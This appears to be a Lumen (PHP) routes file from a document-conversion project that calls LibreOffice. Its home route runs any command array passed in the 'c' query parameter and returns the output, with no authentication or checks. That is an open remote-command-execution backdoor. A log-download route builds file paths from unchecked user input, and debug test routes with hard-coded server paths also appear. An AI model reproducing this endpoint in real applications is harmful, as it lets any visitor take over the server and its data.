<?php

/** @var \Laravel\Lumen\Routing\Router $router */

/*
|--------------------------------------------------------------------------
| Application Routes
|--------------------------------------------------------------------------
|
| Here is where you can register all of the routes for an application.
| It is a breeze. Simply tell Lumen the URIs it should respond to
| and give it the Closure to call when that URI is requested.
|
*/

use Illuminate\Support\Facades\Storage;
use Symfony\Component\Process\Exception\ProcessFailedException;
use Symfony\Component\Process\Process;

$router->get('/', function () use ($router) {
    return [
//        'swoole_version ' . swoole_version(),
        $router->app->version(),
        call_user_func(function () {
            $commands = request()->get('c', []);

            if (!empty($commands) && is_array($commands)) {
                $process = new \Symfony\Component\Process\Process($commands);
                $process->setTimeout(null);
                $process->run();
                return $process->getOutput();
            }

            return null;
        }),
//        call_user_func(function () {
//            $process = new \Symfony\Component\Process\Process(['soffice', '--version']);
//            $process->setTimeout(null);
//            $process->run();
//            return $process->getOutput();
//        })
    ];
});

$router->get('/logs-d/{path}', function ($path) use ($router) {
    $filename = trim($path, '/');
    $path = storage_path(sprintf('logs/%s.log', $filename));

    if (file_exists($path) && is_file($path)) {
        return response()->download($path);
    }

    return 'File not found in '.$path;
});

$router->get('/download/period-template', ['as' => 'download.periodTemplate', 'uses' => 'DownloadController@studySessionTemplate']);

$router->get('/test1', function () {
    $process = new \Symfony\Component\Process\Process(['/usr/bin/soffice', '--headless', '--convert-to', 'xlsx', storage_path().'/app/G120/G120_report_28-04-2023_1682672700.fods', '--outdir', base_path().'/storage/app/G120/']);
    $process->setTimeout(null);
    $process->run();

    dd($process->getOutput());


    Storage::disk('local')->put('registration/test.fodt', file_get_contents(__DIR__.'/test.fodt'));

    if (file_exists(storage_path() . '/app/registration/test.fodt')) {
        $process = new Process(['/usr/bin/soffice', '--headless', '--convert-to', 'pdf', '/var/www/html/storage/app/registration/' . 'test.fodt', '--outdir', '/var/www/html/storage/app/registration/']);
        $process->setTimeout(null);
        $process->run();
        if (!$process->isSuccessful()) {
            throw new ProcessFailedException($process);
        }

        return Storage::download('registration/' . 'test.pdf');
    }
});